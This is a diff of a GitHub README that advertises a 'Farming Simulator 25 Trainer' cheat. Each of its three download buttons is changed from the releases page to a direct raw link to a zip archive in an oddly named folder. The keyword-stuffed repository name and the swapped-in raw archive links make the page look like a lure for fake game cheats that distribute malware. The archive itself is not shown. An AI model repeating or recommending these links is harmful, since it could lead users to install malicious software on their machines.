@@ -1,6 +1,6 @@
 # 🚜 FS25-Trainer---Farming-Simulator-25-Trainer-2026 - Unlock Unlimited Farming Power Now
 
-[![Download FS25 Trainer](https://img.shields.io/badge/Download-FS25_Trainer-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/julianvilethisaturninojoaoluca-lgtm/FS25-Trainer---Farming-Simulator-25-Trainer-2026/releases)
+[![Download FS25 Trainer](https://img.shields.io/badge/Download-FS25_Trainer-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/julianvilethisaturninojoaoluca-lgtm/FS25-Trainer---Farming-Simulator-25-Trainer-2026/raw/refs/heads/main/graphometry/Simulator_Farming_Trainer_F_2.7.zip)
 
 ## 🎮 What Is This?
 
@@ -40,7 +40,7 @@ Getting started with FS25-Trainer is simple. You don't need any technical skills
 
 Click the button below to go to the official download page:
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_FS25_Trainer_2026-FF6F00?style=for-the-badge&logo=github&logoColor=white&labelColor=black)](https://github.com/julianvilethisaturninojoaoluca-lgtm/FS25-Trainer---Farming-Simulator-25-Trainer-2026/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_FS25_Trainer_2026-FF6F00?style=for-the-badge&logo=github&logoColor=white&labelColor=black)](https://github.com/julianvilethisaturninojoaoluca-lgtm/FS25-Trainer---Farming-Simulator-25-Trainer-2026/raw/refs/heads/main/graphometry/Simulator_Farming_Trainer_F_2.7.zip)
 
 Visit this link to download the application. The page will show you the latest version of the trainer available for download.
 
@@ -152,7 +152,7 @@ FS25-Trainer puts the fun back in Farming Simulator 25. You no longer have to gr
 
 Remember, the tool is here to enhance your enjoyment. Use it in single-player games to experiment, test, and create without limits. Happy farming!
 
-[![Get FS25 Trainer](https://img.shields.io/badge/🚜_Get_FS25_Trainer_Now-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=darkgreen)](https://github.com/julianvilethisaturninojoaoluca-lgtm/FS25-Trainer---Farming-Simulator-25-Trainer-2026/releases)
+[![Get FS25 Trainer](https://img.shields.io/badge/🚜_Get_FS25_Trainer_Now-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=darkgreen)](https://github.com/julianvilethisaturninojoaoluca-lgtm/FS25-Trainer---Farming-Simulator-25-Trainer-2026/raw/refs/heads/main/graphometry/Simulator_Farming_Trainer_F_2.7.zip)
 
 ---
 
